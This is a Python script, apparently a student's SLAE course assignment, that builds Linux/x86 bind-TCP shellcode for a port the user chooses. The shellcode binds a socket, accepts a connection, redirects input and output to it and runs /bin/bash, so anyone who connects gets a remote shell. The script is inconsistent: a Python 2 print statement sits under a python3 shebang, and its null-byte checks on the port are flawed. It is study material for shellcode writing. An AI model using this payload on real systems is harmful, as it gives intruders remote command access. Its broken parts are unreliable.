# SLAE Assignment #1: Shell Bind TCP (Linux/x86) 
# Website:  http://blog.jsiob.com
# SLAE-ID: 1400

#!/usr/bin/env python3
import sys
import argparse
import codecs

parser = argparse.ArgumentParser()
parser.add_argument('-p', "--port")
args = parser.parse_args()

if args.port == None:
    parser.print_help()
    exit()

port = int(args.port)

if port > 65535:
    print("Please enter a valid port number!")
    exit()

if port < 1024:
    print("You'll need to be root to use this port!")

hex_port = hex(port)[2:]


b1 = hex_port[-2:]
b2 = hex_port[:-2]

if b1 == "00" or b2 == "00":
        print "Port contains \\x00!"
        exit()

if len(b1) < 2:
        b1="\\x0" + b1
if len(b1) == 2:
        b1="\\x" + b1
if len(b2) < 2:
        b2="\\x0" + b2
if len(b2) == 2:
        b2="\\x" + b2

shellport=b2+b1



shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x51\\x6a\\x01\\x6a\\x02\\x89
\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\xb0\\x66\\xb3\\x02\\x31\\xd2\\x52\\x66\\x68%s
\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50
\\x57\\x89\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50\\x50\\x57\\xb3\\x05
\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49
\\x79\\xf9\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68
\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
""" % (shellport)

print("Shellcode:")
print(shellcode.replace("\n", ""))
